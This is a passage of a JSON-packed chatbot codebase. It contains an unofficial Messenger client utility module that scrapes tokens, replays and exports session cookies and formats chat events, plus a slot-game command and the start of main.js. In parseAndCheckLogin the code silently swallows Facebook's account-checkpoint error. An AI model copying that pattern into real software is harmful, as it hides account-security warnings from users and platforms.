\"log:unsubscribe\";\n        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };\n    break;\n    case \"UserLocation\": {\n        logMessageType = \"log:user-location\";\n        logMessageData = {\n            Image: m.attachments[0].mercury.extensible_attachment.story_attachment.media.image,\n            Location: m.attachments[0].mercury.extensible_attachment.story_attachment.target.location_title,\n            coordinates: m.attachments[0].mercury.extensible_attachment.story_attachment.target.coordinate,\n            url: m.attachments[0].mercury.extensible_attachment.story_attachment.url\n        };\n    }\n}\nswitch (hasData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()))) {\n    case true: {\n        switch (logMessageType) {\n            case \"log:thread-color\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.emoji = (logMessageData.theme_emoji || x.emoji);\n                x.color = (logMessageData['theme_color'] || x.color);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-icon\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.emoji = (logMessageData['thread_icon'] || x.emoji);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:user-nickname\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.nicknames[logMessageData.participant_id] = (logMessageData.nickname.length == 0 ? x.userInfo.find(i => i.id == String(logMessageData.participant_id)).name : logMessageData.nickname);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-admins\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                switch (logMessageData.ADMIN_EVENT) {\n                    case \"add_admin\": {\n                        x.adminIDs.push({ id: logMessageData.TARGET_ID });\n                    }\n                        break;\n                    case \"remove_admin\": {\n                        x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.TARGET_ID);\n                    }\n                    break;\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-approval-mode\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                if (x.approvalMode == true) { \n                    x.approvalMode = false;\n                }\n                else {\n                    x.approvalMode = true;\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-name\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.threadName = (logMessageData.name || formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:subscribe\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                for (let o of logMessageData.addedParticipants) {\n                    if (x.userInfo.some(i => i.id == o.userFbId)) continue; \n                    else {\n                        x.userInfo.push({\n                            id: o.userFbId,\n                            name: o.fullName,\n                            gender: getGenderByPhysicalMethod(o.fullName)\n                        });\n                        x.participantIDs.push(o.userFbId);\n                    }\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:unsubscribe\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.participantIDs = x.participantIDs.filter(item => item != logMessageData.leftParticipantFbId);\n                x.userInfo = x.userInfo.filter(item => item.id != logMessageData.leftParticipantFbId);\n                    if (x.adminIDs.some(i => i.id == logMessageData.leftParticipantFbId)) {\n                        x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.leftParticipantFbId);\n                    }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);      \n            }\n            break;\n        }\n    }\n}\n\nreturn {\n    type: \"event\",\n    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),\n    logMessageType: logMessageType,\n    logMessageData: logMessageData,\n    logMessageBody: m.messageMetadata.adminText,\n    author: m.messageMetadata.actorFbId,\n    participantIDs: m.participants || []\n    };  \n}\n\n/**\n * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event\n */\n\nfunction formatTyp(event) {\nreturn {\n        isTyping: !!event.st,\n        from: event.from.toString(),\n        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),\n        // When receiving typ indication from mobile, `from_mobile` isn't set.\n        // If it is, we just use that value.\n        fromMobile: event.hasOwnProperty(\"from_mobile\") ? event.from_mobile : true,\n        userID: (event.realtime_viewer_fbid || event.from).toString(),\n        type: \"typ\"\n    };\n}\n\n/**\n * @param {{ threadKey: { otherUserFbId: any; threadFbId: any; }; actorFbId: any; actionTimestampMs: any; }} delta\n */\n\nfunction formatDeltaReadReceipt(delta) {\n    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.\n    // In a group chat actorFbId is used for the reader and threadFbId for the thread.\n    return {\n        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),\n        time: delta.actionTimestampMs,\n        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),\n        type: \"read_receipt\"\n    };\n}\n\n/**\n * @param {{ reader: { toString: () => any; }; time: any; thread_fbid: any; }} event\n */\n\nfunction formatReadReceipt(event) {\n    return {\n        reader: event.reader.toString(),\n        time: event.time,\n        threadID: formatID((event.thread_fbid || event.reader).toString()),\n        type: \"read_receipt\"\n    };\n}\n\n/**\n * @param {{ chat_ids: any[]; thread_fbids: any[]; timestamp: any; }} event\n */\n\nfunction formatRead(event) {\n    return {\n        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),\n        time: event.timestamp,\n        type: \"read\"\n    };\n}\n\n/**\n * @param {string} str\n * @param {string | any[]} startToken\n * @param {string} endToken\n */\n\nfunction getFrom(str, startToken, endToken) {\n    var start = str.indexOf(startToken) + startToken.length;\n    if (start < startToken.length) return \"\";\n\n    var lastHalf = str.substring(start);\n    var end = lastHalf.indexOf(endToken);\n    if (end === -1) throw Error(\"Could not find endTime `\" + endToken + \"` in the given string.\");\n    return lastHalf.substring(0, end);\n}\n\n/**\n * @param {string} html\n */\n\nfunction makeParsable(html) {\n    let withoutForLoop = html.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/\n, \"\");\n\n    // (What the fuck FB, why windows style newlines?)\n    // So sometimes FB will send us base multiple objects in the same response.\n    // They're all valid JSON, one after the other, at the top level. We detect\n    // that and make it parse-able by JSON.parse.\n    //       Ben - July 15th 2017\n    //\n    // It turns out that Facebook may insert random number of spaces before\n    // next object begins (issue #616)\n    //       rav_kr - 2018-03-19\n    let maybeMultipleObjects = withoutForLoop.split(/\\}\\r\\n *\\{/);\n    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;\n\n    return \"[\" + maybeMultipleObjects.join(\"},{\") + \"]\";\n}\n\n/**\n * @param {any} form\n */\n\nfunction arrToForm(form) {\n    return arrayToObject(form,\n        function(/** @type {{ name: any; }} */v) {\n            return v.name;\n        },\n        function(/** @type {{ val: any; }} */v) {\n            return v.val;\n        }\n    );\n}\n\n/**\n * @param {any[]} arr\n * @param {{ (v: any): any; (arg0: any): string | number; }} getKey\n * @param {{ (v: any): any; (arg0: any): any; }} getValue\n */\n\nfunction arrayToObject(arr, getKey, getValue) {\n    return arr.reduce(function(/** @type {{ [x: string]: any; }} */\n acc, /** @type {any} */val) {\n        acc[getKey(val)] = getValue(val);\n        return acc;\n    }, {});\n}\n\nfunction getSignatureID() {\n    return Math.floor(Math.random() * 2147483648).toString(16);\n}\n\nfunction generateTimestampRelative() {\n    var d = new Date();\n    return d.getHours() + \":\" + padZeros(d.getMinutes());\n}\n\n/**\n * @param {any} html\n * @param {any} userID\n * @param {{ fb_dtsg: any; ttstamp: any; globalOptions: any; }} ctx\n */\n\nfunction makeDefaults(html, userID, ctx) {\n    var reqCounter = 1;\n    var fb_dtsg = getFrom(html, 'name=\"fb_dtsg\" value=\"', '\"');\n\n    // @Hack Ok we've done hacky things, this is definitely on top 5.\n    // We totally assume the object is flat and try parsing until a }.\n    // If it works though it's cool because we get a bunch of extra data things.\n    //\n    // Update: we don't need this. Leaving it in in case we ever do.\n    //       Ben - July 15th 2017\n\n    // var siteData = getFrom(html, \"[\\\"SiteData\\\",[],\", \"},\");\n    // try {\n    //   siteData = JSON.parse(siteData + \"}\");\n    // } catch(e) {\n    //   log.warn(\"makeDefaults\", \"Couldn't parse SiteData. Won't have access to some variables.\");\n    //   siteData = {};\n    // }\n\n    var ttstamp = \"2\";\n    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);\n    var revision = getFrom(html, 'revision\":', \",\");\n\n    /**\n     * @param {{ [x: string]: any; hasOwnProperty: (arg0: string) => any; }} obj\n     */\n\n    function mergeWithDefaults(obj) {\n        // @TODO This is missing a key called __dyn.\n        // After some investigation it seems like __dyn is some sort of set that FB\n        // calls BitMap. It seems like certain responses have a \"define\" key in the\n        // res.jsmods arrays. I think the code iterates over those and calls `set`\n        // on the bitmap for each of those keys. Then it calls\n        // bitmap.toCompressedString() which returns what __dyn is.\n        //\n        // So far the API has been working without this.\n        //\n        //              Ben - July 15th 2017\n        var newObj = {\n            __user: userID,\n            __req: (reqCounter++).toString(36),\n            __rev: revision,\n            __a: 1,\n            // __af: siteData.features,\n            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,\n            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp\n                // __spin_r: siteData.__spin_r,\n                // __spin_b: siteData.__spin_b,\n                // __spin_t: siteData.__spin_t,\n        };\n\n        // @TODO this is probably not needed.\n        //         Ben - July 15th 2017\n        // if (siteData.be_key) {\n        //   newObj[siteData.be_key] = siteData.be_mode;\n        // }\n        // if (siteData.pkg_cohort_key) {\n        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;\n        // }\n\n        if (!obj) return newObj;\n        for (var prop in obj)\n            if (obj.hasOwnProperty(prop))\n                if (!newObj[prop]) newObj[prop] = obj[prop];\n        return newObj;\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} form\n     * @param {any} ctxx\n     */\n\n    function postWithDefaults(url, jar, form, ctxx) {\n        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} qs\n     * @param {any} ctxx\n     */\n\n    function getWithDefaults(url, jar, qs, ctxx) {\n        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} form\n     * @param {any} qs\n     * @param {any} ctxx\n     */\n\n    function postFormDataWithDefault(url, jar, form, qs, ctxx) {\n        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);\n    }\n\n    return {\n        get: getWithDefaults,\n        post: postWithDefaults,\n        postFormData: postFormDataWithDefault\n    };\n}\n\n/**\n * @param {{ jar: { setCookie: (arg0: string, arg1: string) => void; }; fb_dtsg: string; ttstamp: string; }} ctx\n * @param {{ postFormData: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; post: (arg0: string, arg1: any, arg2: any) => any; get: (arg0: any, arg1: any) => Promise<any>; }} defaultFuncs\n * @param {string | number} [retryCount]\n */\n\nfunction parseAndCheckLogin(ctx, defaultFuncs, retryCount) {\n    if (retryCount == undefined) retryCount = 0;\n    return function(/** @type {{ body: string; statusCode: string | number; request: { uri: { protocol: string; hostname: string; pathname: string; }; headers: { [x: string]: string; }; formData: any; method: string; }; }} */data) {\n        return bluebird.try(function() {\n            log.verbose(\"parseAndCheckLogin\", data.body);\n            if (data.statusCode >= 500 && data.statusCode < 600) {\n                if (retryCount >= 5) {\n                    throw {\n                        error: \"Request retry failed. Check the `res` and `statusCode` property on this error.\",\n                        statusCode: data.statusCode,\n                        res: data.body\n                    };\n                }\n                retryCount++;\n                var retryTime = Math.floor(Math.random() * 5000);\n                log.warn(\"parseAndCheckLogin\", \"Got status code \" + data.statusCode + \" - \" + retryCount + \". attempt to retry in \" + retryTime + \" milliseconds...\");\n                var url = data.request.uri.protocol + \"//\" + data.request.uri.hostname + data.request.uri.pathname;\n                if (data.request.headers[\"Content-Type\"].split(\";\")[0] === \"multipart/form-data\") {\n                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))\n                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));\n                } else {\n                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))\n                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));\n                }\n            }\n            if (data.statusCode !== 200) throw new Error(\"parseAndCheckLogin got status code: \" + data.statusCode + \". Bailing out of trying to parse response.\");\n\n            var res = null;\n            try {\n                res = JSON.parse(makeParsable(data.body));\n            } catch (e) {\n                throw {\n                    error: \"JSON.parse error. Check the `detail` property on this error.\",\n                    detail: e,\n                    res: data.body\n                };\n            }\n\n            // In some cases the response contains only a redirect URL which should be followed\n            if (res.redirect && data.request.method === \"GET\") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));\n\n            // TODO: handle multiple cookies?\n            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === \"Cookie\") {\n                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace(\"_js_\", \"\");\n                var cookie = formatCookie(res.jsmods.require[0][3], \"facebook\");\n                var cookie2 = formatCookie(res.jsmods.require[0][3], \"messenger\");\n                ctx.jar.setCookie(cookie, \"https://www.facebook.com\");\n                ctx.jar.setCookie(cookie2, \"https://www.messenger.com\");\n            }\n\n            // On every request we check if we got a DTSG and we mutate the context so that we use the latest\n            // one for the next requests.\n            if (res.jsmods && Array.isArray(res.jsmods.require)) {\n                var arr = res.jsmods.require;\n                for (var i in arr) {\n                    if (arr[i][0] === \"DTSG\" && arr[i][1] === \"setToken\") {\n                        ctx.fb_dtsg = arr[i][3][0];\n\n                        // Update ttstamp since that depends on fb_dtsg\n                        ctx.ttstamp = \"2\";\n                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);\n                    }\n                }\n            }\n\n            if (res.error === 1357001) {\n    // B·ªè qua l·ªói checkpoint m·ªôt c√°ch √¢m th·∫ßm v√† tr·∫£ v·ªÅ m·ªôt ƒë·ªëi t∆∞·ª£ng r·ªóng\n    return {};\n}\nelse return res;\n        });\n    };\n}\n\n/**\n * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar\n */\n\nfunction saveCookies(jar) {\n    return function(/** @type {{ headers: { [x: string]: any[]; }; }} */res) {\n        var cookies = res.headers[\"set-cookie\"] || [];\n        cookies.forEach(function(/** @type {string} */c) {\n            if (c.indexOf(\".facebook.com\") > -1) { // yo wtf is this?\n                jar.setCookie(c, \"https://www.facebook.com\");\n                jar.setCookie(c.replace(/domain=\\.facebook\\.com/, \"domain=.messenger.com\"), \"https://www.messenger.com\");\n            }\n        });\n        return res;\n    };\n}\n\nvar NUM_TO_MONTH = [\n    \"Jan\",\n    \"Feb\",\n    \"Mar\",\n    \"Apr\",\n    \"May\",\n    \"Jun\",\n    \"Jul\",\n    \"Aug\",\n    \"Sep\",\n    \"Oct\",\n    \"Nov\",\n    \"Dec\"\n];\nvar NUM_TO_DAY = [\"Sun\", \"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\"];\n\n/**\n * @param {{ getUTCDate: () => any; getUTCHours: () => any; getUTCMinutes: () => any; getUTCSeconds: () => any; getUTCDay: () => string | number; getUTCMonth: () => string | number; getUTCFullYear: () => string; }} date\n */\n\nfunction formatDate(date) {\n    var d = date.getUTCDate();\n    d = d >= 10 ? d : \"0\" + d;\n    var h = date.getUTCHours();\n    h = h >= 10 ? h : \"0\" + h;\n    var m = date.getUTCMinutes();\n    m = m >= 10 ? m : \"0\" + m;\n    var s = date.getUTCSeconds();\n    s = s >= 10 ? s : \"0\" + s;\n    return (NUM_TO_DAY[date.getUTCDay()] + \", \" + d + \" \" + NUM_TO_MONTH[date.getUTCMonth()] + \" \" + date.getUTCFullYear() + \" \" + h + \":\" + m + \":\" + s + \" GMT\");\n}\n\n/**\n * @param {string[]} arr\n * @param {string} url\n */\n\nfunction formatCookie(arr, url) {\n    return arr[0] + \"=\" + arr[1] + \"; Path=\" + arr[3] + \"; Domain=\" + url + \".com\";\n}\n\n/**\n * @param {{ thread_fbid: { toString: () => any; }; participants: any[]; name: any; custom_nickname: any; snippet: any; snippet_attachments: any; snippet_sender: any; unread_count: any; message_count: any; image_src: any; timestamp: any; mute_until: any; is_canonical_user: any; is_canonical: any; is_subscribed: any; folder: any; is_archived: any; recipients_loadable: any; has_email_participant: any; read_only: any; can_reply: any; cannot_reply_reason: any; last_message_timestamp: any; last_read_timestamp: any; last_message_type: any; custom_like_icon: any; custom_color: any; admin_ids: any; thread_type: any; }} data\n */\n\nfunction formatThread(data) {\n    return {\n        threadID: formatID(data.thread_fbid.toString()),\n        participants: data.participants.map(formatID),\n        participantIDs: data.participants.map(formatID),\n        name: data.name,\n        nicknames: data.custom_nickname,\n        snippet: data.snippet,\n        snippetAttachments: data.snippet_attachments,\n        snippetSender: formatID((data.snippet_sender || \"\").toString()),\n        unreadCount: data.unread_count,\n        messageCount: data.message_count,\n        imageSrc: data.image_src,\n        timestamp: data.timestamp,\n        muteUntil: data.mute_until,\n        isCanonicalUser: data.is_canonical_user,\n        isCanonical: data.is_canonical,\n        isSubscribed: data.is_subscribed,\n        folder: data.folder,\n        isArchived: data.is_archived,\n        recipientsLoadable: data.recipients_loadable,\n        hasEmailParticipant: data.has_email_participant,\n        readOnly: data.read_only,\n        canReply: data.can_reply,\n        cannotReplyReason: data.cannot_reply_reason,\n        lastMessageTimestamp: data.last_message_timestamp,\n        lastReadTimestamp: data.last_read_timestamp,\n        lastMessageType: data.last_message_type,\n        emoji: data.custom_like_icon,\n        color: data.custom_color,\n        adminIDs: data.admin_ids,\n        threadType: data.thread_type\n    };\n}\n\n/**\n * @param {any} obj\n */\n\nfunction getType(obj) {\n    return Object.prototype.toString.call(obj).slice(8, -1);\n}\n\n/**\n * @param {{ lat: number; p: any; }} presence\n * @param {any} userID\n */\n\nfunction formatProxyPresence(presence, userID) {\n    if (presence.lat === undefined || presence.p === undefined) return null;\n    return {\n        type: \"presence\",\n        timestamp: presence.lat * 1000,\n        userID: userID || '',\n        statuses: presence.p\n    };\n}\n\n/**\n * @param {{ la: number; a: any; }} presence\n * @param {any} userID\n */\n\nfunction formatPresence(presence, userID) {\n    return {\n        type: \"presence\",\n        timestamp: presence.la * 1000,\n        userID: userID || '',\n        statuses: presence.a\n    };\n}\n\n/**\n * @param {any} payload\n */\n\nfunction decodeClientPayload(payload) {\n    /*\n    Special function which Client using to \"encode\" clients JSON payload\n    */\n\n    /**\n     * @param {string | any[]} array\n     */\n\n    function Utf8ArrayToStr(array) {\n        var out, i, len, c;\n        var char2, char3;\n        out = \"\";\n        len = array.length;\n        i = 0;\n        while (i < len) {\n            c = array[i++];\n            switch (c >> 4) {\n                case 0:\n                case 1:\n                case 2:\n                case 3:\n                case 4:\n                case 5:\n                case 6:\n                case 7:\n                    out += String.fromCharCode(c);\n                    break;\n                case 12:\n                case 13:\n                    char2 = array[i++];\n                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));\n                    break;\n                case 14:\n                    char2 = array[i++]; \n                    char3 = array[i++];\n                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));\n                    break;\n            }\n        }\n        return out;\n    }\n    return JSON.parse(Utf8ArrayToStr(payload));\n}\n\n/**\n * @param {{ getCookies: (arg0: string) => string | any[]; }} jar\n */\n\nfunction getAppState(jar, Encode) {\n    var prettyMilliseconds = require('pretty-ms');\n    var getText = globalThis.Fca.getText;\n    var Security = require(\"./Extra/Security/Base\");\n    var appstate = jar.getCookies(\"https://www.facebook.com\").concat(jar.getCookies(\"https://facebook.com\")).concat(jar.getCookies(\"https://www.messenger.com\"));\n    var logger = require('./logger'),languageFile = require('./Language/index.json');\n    var Language = languageFile.find(i => i.Language == globalThis.Fca.Require.FastConfig.Language).Folder.Index;\n    var data;\n        switch (require(process.cwd() + \"/FastConfigFca.json\").EncryptFeature) {\n            case true: {\n                if (Encode == undefined) Encode = true;\n                if (process.env['FBKEY'] != undefined && Encode) {\n                    logger.Normal(Language.EncryptSuccess);\n                    data = Security(JSON.stringify(appstate),process.env['FBKEY'],\"Encrypt\");\n                }\n                else return appstate;\n            }\n                break;\n            case false: {\n                data = appstate;\n            }\n                break;\n            default: {\n                logger.Normal(getText(Language.IsNotABoolean,require(process.cwd() + \"/FastConfigFca.json\").EncryptFeature));\n                data = appstate;\n            } \n        }\n            if(!globalThis.Fca.Setting.get('getAppState')) {\n                logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - globalThis.Fca.startTime)}`),function() { globalThis.Fca.Setting.set('getAppState',true); });\n            }\n    return data;\n}\n\nfunction getData_Path(Obj , Arr, Stt) {\n    //default stt = 0\n    if (Arr.length === 0 && Obj != undefined) {\n        return Obj; //object\n    }\n    else if (Obj == undefined) {\n        return Stt;\n    }\n    const head = Arr[0];\n    if (head == undefined) {\n        return Stt;\n    }\n    const tail = Arr.slice(1);\n    return getData_Path(Obj[head], tail, Stt++);\n}\n\n\nfunction setData_Path(obj, path, value) {\n    if (!path.length) {\n        return obj;\n    }\n    const currentKey = path[0];\n    let currentObj = obj[currentKey];\n\n    if (!currentObj) {\n        obj[currentKey] = value;\n        currentObj = obj[currentKey];\n    }\n    path.shift();\n    if (!path.length) {\n        currentObj = value;\n    } else {\n        currentObj = setData_Path(currentObj, path, value);\n    }\n\n    return obj;\n}\n\nfunction getPaths(obj, parentPath = []) {\n    let paths = [];\n        for (let prop in obj) {\n            if (typeof obj[prop] === \"object\") {\n                paths = paths.concat(getPaths(obj[prop], [...parentPath, prop]));\n            } else {\n                paths.push([...parentPath, prop]);\n            }\n        }\n    return paths;\n}\n    \nfunction cleanHTML (text) {\n    text = text.replace(/(<br>)|(<\\/?i>)|(<\\/?em>)|(<\\/?b>)|(!?~)|(&amp;)|(&#039;)|(&lt;)|(&gt;)|(&quot;)/g, (match) => {\n        switch (match) {\n          case \"<br>\":\n            return \"\\n\";\n          case \"<i>\":\n          case \"<em>\":\n          case \"</i>\":\n          case \"</em>\":\n            return \"*\";\n          case \"<b>\":\n          case \"</b>\":\n            return \"**\";\n          case \"~!\":\n          case \"!~\":\n            return \"||\";\n          case \"&amp;\":\n            return \"&\";\n          case \"&#039;\":\n            return \"'\";\n          case \"&lt;\":\n            return \"<\";\n          case \"&gt;\":\n            return \">\";\n          case \"&quot;\":\n            return '\"';\n        }\n    });\n    return text;\n}\n\nmodule.exports = {\n    cleanHTML,\n    isReadableStream:isReadableStream,\n    get:get,\n    post:post,\n    postFormData:postFormData,\n    generateThreadingID:generateThreadingID,\n    generateOfflineThreadingID:generateOfflineThreadingID,\n    getGUID:getGUID,\n    getFrom:getFrom,\n    makeParsable:makeParsable,\n    arrToForm:arrToForm,\n    getSignatureID:getSignatureID,\n    getJar: request.jar,\n    generateTimestampRelative:generateTimestampRelative,\n    makeDefaults:makeDefaults,\n    parseAndCheckLogin:parseAndCheckLogin,\n    getGender: getGenderByPhysicalMethod,\n    getData_Path,\n    setData_Path,\n    getPaths,\n    saveCookies,\n    getType,\n    _formatAttachment,\n    formatHistoryMessage,\n    formatID,\n    formatMessage,\n    formatDeltaEvent,\n    formatDeltaMessage,\n    formatProxyPresence,\n    formatPresence,\n    formatTyp,\n    formatDeltaReadReceipt,\n    formatCookie,\n    formatThread,\n    formatReadReceipt,\n    formatRead,\n    generatePresence,\n    generateAccessiblityCookie,\n    formatDate,\n    decodeClientPayload,\n    getAppState,\n    getAdminTextMessageType,\n    setProxy\n};","path":null,"size_bytes":86144,"size_tokens":null},"modules/commands/slot.js":{"content":"module.exports.config = {\n    name: \"slot\",\n    version: \"1.0.1\",\n    hasPermssion: 0,\n    credits: \"Mirai Team\",\n    description: \"ƒê√°nh b·∫°c b·∫±ng h√¨nh th·ª©c hoa qu·∫£\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[s·ªë coin c·∫ßn ƒë·∫∑t]\",\n    cooldowns: 5,\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"missingInput\": \"[ SLOT ] S·ªë ti·ªÅn ƒë·∫∑t c∆∞·ª£c kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng ho·∫∑c l√† s·ªë √¢m\",\n        \"moneyBetNotEnough\": \"[ SLOT ] S·ªë ti·ªÅn b·∫°n ƒë·∫∑t l·ªõn h∆°n ho·∫∑c b·∫±ng s·ªë d∆∞ c·ªßa b·∫°n!\",\n        \"limitBet\": \"[ SLOT ] S·ªë coin ƒë·∫∑t kh√¥ng ƒë∆∞·ª£c d∆∞·ªõi 50$!\",\n        \"returnWin\": \"üé∞ %1 | %2 | %3 üé∞\\nB·∫°n ƒë√£ th·∫Øng v·ªõi %4$\",\n        \"returnLose\": \"üé∞ %1 | %2 | %3 üé∞\\nB·∫°n ƒë√£ thua v√† m·∫•t %4$\"\n    },\n    \"en\": {\n        \"missingInput\": \"[ SLOT ] The bet money must not be blank or a negative number\",\n        \"moneyBetNotEnough\": \"[ SLOT ] The money you betted is bigger than your balance!\",\n        \"limitBet\": \"[ SLOT ] Your bet is too low, the minimum is 50$\",\n        \"returnWin\": \"üé∞ %1 | %2 | %3 üé∞\\nYou won with %4$\",\n        \"returnLose\": \"üé∞ %1 | %2 | %3 üé∞\\nYou lost and loss %4$\"\n    }\n}\n\nmodule.exports.run = async function({ api, event, args, Currencies, getText }) {\n    const { threadID, messageID, senderID } = event;\n    const { getData, increaseMoney, decreaseMoney } = Currencies;\n    const slotItems = [\"üçá\", \"üçâ\", \"üçä\", \"üçè\", \"7‚É£\", \"üçì\", \"üçí\", \"üçå\", \"ü•ù\", \"ü•ë\", \"üåΩ\"];\n    const moneyUser = (await getData(senderID)).money;\n\n    var moneyBet = parseInt(args[0]);\n    if (isNaN(moneyBet) || moneyBet <= 0) return api.sendMessage(getText(\"missingInput\"), threadID, messageID);\n\tif (moneyBet > moneyUser) return api.sendMessage(getText(\"moneyBetNotEnough\"), threadID, messageID);\n\tif (moneyBet < 50) return api.sendMessage(getText(\"limitBet\"), threadID, messageID);\n    var number = [], win = false;\n    for (i = 0; i < 3; i++) number[i] = Math.floor(Math.random() * slotItems.length);\n    if (number[0] == number[1] && number[1] == number[2]) {\n        moneyBet *= 9;\n        win = true;\n    }\n    else if (number[0] == number[1] || number[0] == number[2] || number[1] == number[2]) {\n        moneyBet *= 2;\n        win = true;\n    }\n    switch (win) {\n        case true: {\n            api.sendMessage(getText(\"returnWin\", slotItems[number[0]], slotItems[number[1]], slotItems[number[2]], moneyBet), threadID, messageID);\n            await increaseMoney(senderID, moneyBet);\n            break;\n        }\n        case false: {\n            api.sendMessage(getText(\"returnLose\", slotItems[number[0]], slotItems[number[1]], slotItems[number[2]], moneyBet), threadID, messageID);\n            await decreaseMoney(senderID, moneyBet);\n            break;\n        }\n    }\n}","path":null,"size_bytes":2794,"size_tokens":null},"main.js":{"content":"//////////////////////////////////////////////////////\n//========= Require all variable need use =========//\n/////////////////////////////////////////////////////\nconst moment = require(\"moment-timezone\");\nconst { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, rm } = require(\"fs-extra\");\nconst { join, resolve } = require(\"path\");\nconst { execSync } = require('child_process');\nconst logger = require(\"./utils/log.js\");\nconst login = require(\"./lib/fca-auto\"); \nconst axios = require(\"axios\");\nconst listPackage = JSON.parse(readFileSync('./package.json')).dependencies;\nconst listbuiltinModules = require(\"module\").builtinModules;\n\n\n\nglobal.client = new Object({\n    commands: new Map(),\n    events: new Map(),\n    cooldowns: new Map(),\n    eventRegistered: new Array(),\n    handleSchedule: new Array(),\n    handleReaction: new Array(),\n    handleReply: new Array(),\n    mainPath: process.cwd(),\n    configPath: new String(),\n  getTime: function (option) {\n        switch (option) {\n            case \"seconds\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"ss\")}`;\n            case \"minutes\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"mm\")}`;\n            case \"hours\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH\")}`;\n            case \"date\": \n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"DD\")}`;\n            case \"month\":\n                return 